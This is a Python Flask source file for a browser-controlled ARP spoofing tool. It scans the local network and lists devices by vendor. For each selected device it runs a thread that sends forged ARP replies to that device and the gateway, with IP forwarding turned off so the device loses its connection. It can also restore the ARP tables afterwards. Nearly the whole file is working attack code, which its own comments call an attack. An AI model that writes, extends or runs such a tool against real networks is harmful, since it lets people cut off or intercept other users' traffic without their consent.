import os
import sys
import time
import signal
import threading
import json
import socket
from flask import Flask, render_template, jsonify, request
from scapy.all import ARP, Ether, srp, sendp, conf
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# --- Network Configuration Utilities ---

VENDORS = {
    # (Same OUI list as net_controller.py, truncated for space but can be expanded)
    "00:03:93": "Apple", "00:05:02": "Apple", "00:00:F0": "Samsung", 
    "00:13:10": "Linksys", "00:21:29": "TP-Link", "00:14:22": "Dell",
}

class ArpManager:
    def __init__(self):
        self.gateway_ip = self._detect_gateway()
        self.interface = conf.iface
        self.gateway_mac = self._get_mac(self.gateway_ip) if self.gateway_ip else None
        self.active_targets = {}  # {ip: {"mac": mac, "name": name, "vendor": vendor, "thread": thread, "running": bool}}
        self.is_running = True
        self._init_system()

    def _init_system(self):
        """Prepare system settings"""
        # We start with IP forwarding OFF to ensure 'Cut' works by default
        self._toggle_ip_forwarding(enable=False)

    def _detect_gateway(self):
        try: return conf.route.route("0.0.0.0")[2]
        except: return None

    def _toggle_ip_forwarding(self, enable=False):
        val = "1" if enable else "0"
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(val)
        except: pass

    def _get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans: return ans[0][1].hwsrc
        return None

    def _get_hostname(self, ip):
        try: return socket.gethostbyaddr(ip)[0]
        except: return "Unknown Host"

    def scan(self):
        if not self.gateway_ip: return []
        ip_range = ".".join(self.gateway_ip.split(".")[:-1]) + ".0/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=3, verbose=False)
        
        devices = []
        for _, rec in ans:
            ip = rec.psrc
            mac = rec.hwsrc
            if ip == self.gateway_ip: continue # Skip gateway itself
            
            vendor = VENDORS.get(mac.upper()[:8], "Unknown")
            name = self._get_hostname(ip)
            is_attacking = ip in self.active_targets and self.active_targets[ip]["running"]
            
            devices.append({"ip": ip, "mac": mac, "vendor": vendor, "name": name, "attacking": is_attacking})
        return devices

    def _spoof_loop(self, target_ip, target_mac):
        """Individual spoofing thread for a target"""
        # Fixed Scapy warnings by explicitly providing the Ethernet layer with destination MAC
        # Tell target I am gateway
        pkt_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
        # Tell gateway I am target
        pkt_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip)
        
        while self.is_running and target_ip in self.active_targets and self.active_targets[target_ip]["running"]:
            sendp(pkt_target, verbose=False)
            sendp(pkt_gateway, verbose=False)
            time.sleep(2)

    def toggle_attack(self, ip, mac, state):
        """Enable or disable spoofing for a specific IP"""
        if state: # Start attack
            if ip not in self.active_targets:
                self.active_targets[ip] = {"mac": mac, "running": True}
                t = threading.Thread(target=self._spoof_loop, args=(ip, mac))
                t.daemon = True
                self.active_targets[ip]["thread"] = t
                t.start()
            else:
                self.active_targets[ip]["running"] = True
                if not self.active_targets[ip]["thread"].is_alive():
                    t = threading.Thread(target=self._spoof_loop, args=(ip, mac))
                    t.daemon = True
                    self.active_targets[ip]["thread"] = t
                    t.start()
        else: # Stop attack
            if ip in self.active_targets:
                self.active_targets[ip]["running"] = False
                # Send restoration packets
                self._restore(ip, mac)

    def _restore(self, ip, mac):
        pkt_target = Ether(dst=mac)/ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        pkt_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=mac)
        sendp(pkt_target, count=5, verbose=False)
        sendp(pkt_gateway, count=5, verbose=False)

    def stop_all(self):
        self.is_running = False
        for ip, info in self.active_targets.items():
            info["running"] = False
            self._restore(ip, info["mac"])
        self._toggle_ip_forwarding(enable=True)

# Initialize Manager
manager = ArpManager()

# --- Flask Routes ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan')
def api_scan():
    try:
        devices = manager.scan()
        return jsonify({"status": "success", "devices": devices})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/toggle', methods=['POST'])
def api_toggle():
    data = request.json
    ip = data.get('ip')
    mac = data.get('mac')
    state = data.get('state') # True to cut, False to restore
    if not ip or not mac: return jsonify({"status": "error", "message": "Missing IP/MAC"}), 400
    
    manager.toggle_attack(ip, mac, state)
    return jsonify({"status": "success", "ip": ip, "state": state})

@app.route('/api/status')
def api_status():
    status = []
    for ip, info in manager.active_targets.items():
        if info["running"]: status.append(ip)
    return jsonify({"status": "success", "attacking": status})

if __name__ == '__main__':
    if os.getuid() != 0:
        print("[!] Must run as root (sudo)")
        sys.exit(1)
    
    def signal_handler(sig, frame):
        print("\nShutting down and restoring network...")
        manager.stop_all()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    app.run(host='0.0.0.0', port=5000, debug=False)
